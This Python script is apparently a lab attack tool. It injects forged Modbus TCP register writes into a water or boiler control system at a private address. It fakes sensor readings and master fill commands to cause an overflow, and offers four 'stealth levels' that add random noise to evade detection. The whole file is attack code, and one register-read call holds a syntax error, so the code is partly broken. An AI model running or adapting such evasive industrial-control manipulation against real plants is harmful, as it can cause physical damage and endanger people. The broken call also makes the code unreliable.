import random
import networkEncoder as ne
from pymodbus.client.sync import ModbusTcpClient

MODBUS_SLAVE = '192.168.56.102'

random.seed(100)
response = ''

client = ModbusTcpClient(MODBUS_SLAVE)

print("Sensors online, enter injection attack type:")
print("[r]esponse - Fake slave values to trigger overflow")
print("[c]ommand  - Fake master values to trigger overflow")
print("[q]uit")

while response != 'r' and response != 'c' and response != 'q':
    response = input('>')

if response == 'q':
    exit(0)

if response == 'r':
    print("Enter stealth level:")
    print("[1] - Blatantly obvious")
    print("[2] - Plausible")
    print("[3] - Harder to detect")
    print("[4] - Hard to detect")
    print("[q]uit")

    while response != '1' and response != '2' and response != '3' and response != '4' and response != 'q':
        response = input('>')

    if response == 'q':
        exit(0)

    if response == '1':
        while True:
            #10,000L below optimum level
            results = []
            result = client.read_holding_registers(3, 4, unit=1)
            waterLevel = ne.modbusDecode(0, 4, 4, result.registers)

            outputs = []
            levelElements = ne.modbusEncode(500000 - 1000, 4, 4, outputs)
            result.registers[0] = levelElements[0]
            result.registers[1] = levelElements[1]
            result.registers[2] = levelElements[2]
            result.registers[3] = levelElements[3]
            result.registers[20] = 1
            write = client.write_registers(0, result.registers, unit=1)
    if response == '2':
        while True:
            #1,000L below optimum level
            results = []
            result = client.read_holding_registers(3, , unit=1)
            waterLevel = ne.modbusDecode(0, 4, 4, result.registers)

            outputs = []
            levelElements = ne.modbusEncode(500000 - 1000, 4, 4, outputs)
            result.registers[0] = levelElements[0]
            result.registers[1] = levelElements[1]
            result.registers[2] = levelElements[2]
            result.registers[3] = levelElements[3]
            result.registers[20] = 1
            write = client.write_registers(3, result.registers, unit=1)
    if response == '3':
        while True:
            #Constantly 1,500L below optimum level +- 15%
            result = client.read_holding_registers(3, 19, unit=1)
            waterLevel = ne.modbusDecode(0, 4, 4, result.registers)
            waterLevel = 500000 - (1500 * (random.randint(85,115)/100))

            outputs = []
            levelElements = ne.modbusEncode(waterLevel, 4, 4, outputs)
            result.registers[0] = levelElements[0]
            result.registers[1] = levelElements[1]
            result.registers[2] = levelElements[2]
            result.registers[3] = levelElements[3]
            result.registers[20] = 1
            write = client.write_registers(3, result.registers, unit=1)
    if response == '4':
        while True:
            # Constantly 1,500L below optimum level +- 15% + last add of water from master
            result = client.read_holding_registers(3, 19, unit=1)
            addWater = ne.modbusDecode(0, 2, 2, result.registers)
            waterLevel = ne.modbusDecode(3, 4, 4, result.registers)
            steamStep = ne.modbusDecode(13, 2, 4, result.registers)
            outputs = []
            waterLevel = 500000 - (1500 * (random.randint(85, 115) / 100)) + addWater

            outputs = []
            levelElements = ne.modbusEncode(waterLevel, 4, 4, outputs)
            result.registers[0] = levelElements[0]
            result.registers[1] = levelElements[1]
            result.registers[2] = levelElements[2]
            result.registers[3] = levelElements[3]
            result.registers[20] = 1
            write = client.write_registers(3, result.registers, unit=1)


if response == 'c':
    print("Enter stealth level:")
    print("[1] - Blatantly obvious")
    print("[2] - Plausible")
    print("[3] - Harder to detect")
    print("[4] - Hard to detect")
    print("[q]uit")

    while response != '1' and response != '2' and response != '3' and response != '4' and response != 'q':
        response = input('>')

    if response == 'q':
        exit(0)

    if response == '1':
        while True:
            # 1,500L constant fill, no fire
            result = client.read_holding_registers(0, 22, unit=1)
            addWater = ne.modbusDecode(0, 2, 2, result.registers)
            addWater = 1500

            outputs = []
            result.registers[0] = ne.modbusEncode(addWater, 2, 2, outputs)[0]
            result.registers[1] = ne.modbusEncode(addWater, 2, 2, outputs)[1]
            result.registers[2] = 1
            result.registers[21] = 1
            write = client.write_registers(0, result.registers, unit=1)
    if response == '2':
        while True:
            # 1,500L constant fill, current fire state
            result = client.read_holding_registers(0, 22, unit=1)
            addWater = ne.modbusDecode(0, 2, 2, result.registers)
            addWater = 1500

            outputs = []
            result.registers[0] = ne.modbusEncode(addWater, 2, 2, outputs)[0]
            result.registers[1] = ne.modbusEncode(addWater, 2, 2, outputs)[1]
            result.registers[21] = 1
            write = client.write_registers(0, result.registers, unit=1)
    if response == '3':
        while True:
            # 1,500L constant fill +- 10%, current fire state
            result = client.read_holding_registers(0, 22, unit=1)
            addWater = ne.modbusDecode(0, 2, 2, result.registers)
            addWater = 1500 * (random.randint(90, 110) / 100)

            outputs = []
            result.registers[0] = ne.modbusEncode(addWater, 2, 2, outputs)[0]
            result.registers[1] = ne.modbusEncode(addWater, 2, 2, outputs)[1]
            result.registers[21] = 1
            write = client.write_registers(0, result.registers, unit=1)
    if response == '4':
        while True:
            # Add water value + 0-5%, if no fire, + 5-10% if fire
            result = client.read_holding_registers(0, 22, unit=1)
            addWater = ne.modbusDecode(0, 2, 2, result.registers)
            addFire = ne.modbusDecode(2, 2, 0, result.registers)

            if addFire:
                addWater = 500 + (addWater * (random.randint(105, 110) / 100))
            else:
                addWater = 500 + (addWater * (random.randint(100, 105) / 100))

            print("ADDING", addWater)

            outputs = []
            result.registers[0] = ne.modbusEncode(addWater, 2, 2, outputs)[0]
            result.registers[1] = ne.modbusEncode(addWater, 2, 2, outputs)[1]
            result.registers[21] = 1
            write = client.write_registers(0, result.registers, unit=1)

client.close()